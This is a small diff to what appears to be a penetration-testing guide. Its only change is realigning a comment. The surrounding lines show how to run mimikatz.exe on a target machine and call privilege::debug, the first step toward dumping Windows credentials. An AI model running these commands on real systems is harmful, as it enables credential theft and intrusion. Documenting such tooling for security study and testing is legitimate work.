@@ -89,7 +89,7 @@
 #### Run mimikatz.exe on the Target
 - In the cmd shell on the target...
 ```
-dir    # should see mimikatz.exe in your Temp dir
+dir                       # should see mimikatz.exe in your Temp dir
 mimikatz.exe              # start it up... you get the mikikatz environment and prompt
 privilege::debug          # check your privs
                           # if you get "Privilege | 20 | OK" you have sufficient privs to execute
